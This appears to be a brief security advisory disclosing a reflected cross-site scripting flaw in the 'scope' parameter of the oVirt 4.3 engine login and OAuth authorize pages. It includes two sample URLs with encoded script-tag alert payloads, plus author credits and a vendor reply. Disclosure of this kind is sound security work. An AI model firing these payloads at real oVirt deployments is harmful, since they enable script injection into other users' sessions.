# oVirt-4.3-Reflected-Cross-Site-Scripting

Summary: oVirt-engine Open Virtualization Manager version 4.3 login page is vulnerable to reflected Cross-site scripting (XSS).  The parameter "scope" fails to sanitize the entry, allowing the malicious script to execute as part of the GET request.

Affected Parameter: scope 

Sample urls:
https://x.x.x.x/ovirt-engine/login?scope=ovirt-ext%3dauth%3aidentityxj2o4%3cscript%3ealert('1')%3c%2fscript%3eol2fb

https://x.x.x.x/ovirt-engine/sso/oauth/authorize?client_id=ovirt-engine-core&response_type=code&redirect_uri=https%3A%2F%2Fx.x.x.x%3A443%2Fovirt-engine%2Foauth2-callback&scope=z9wcq%3cscript%3ealert('XSS')%3c%2fscript%3ep4zq5&locale=en_US&source_addr=x.x.x.x

Screenshot:


Response from RedHat:<
oVirt 4.3 is an obsolete version 

Authors: 
Patrick Dean Ramos
Nathu Nandwani
Junnair Manla 